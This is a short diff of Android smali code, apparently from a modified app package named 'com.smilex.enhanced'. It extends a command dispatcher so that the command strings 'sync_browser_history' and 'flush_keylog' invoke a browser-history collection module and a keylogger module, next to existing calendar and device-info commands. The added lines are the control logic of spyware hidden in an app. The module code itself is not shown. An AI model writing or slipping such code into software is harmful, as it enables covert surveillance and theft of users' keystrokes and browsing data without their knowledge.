@@ -360,9 +360,31 @@
     const-string v3, "sync_calendar"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
+    if-eqz v3, :cmd_browser_history
+
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/CalendarModule;->init(Landroid/content/Context;)V
+    invoke-static {}, Lcom/smilex/enhanced/modules/CalendarModule;->syncCalendar()V
+    goto :end
+
+    # --- BROWSER HISTORY ---
+    :cmd_browser_history
+    const-string v3, "sync_browser_history"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_flush_keylog
+
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->init(Landroid/content/Context;)V
+    invoke-static {}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->syncBrowserHistory()V
+    goto :end
+
+    # --- FLUSH KEYLOG ---
+    :cmd_flush_keylog
+    const-string v3, "flush_keylog"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
     if-eqz v3, :cmd_device_info
 
-    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
+    invoke-static {}, Lcom/smilex/enhanced/modules/KeyloggerModule;->flush()V
     goto :end
 
     # --- DEVICE INFO ---
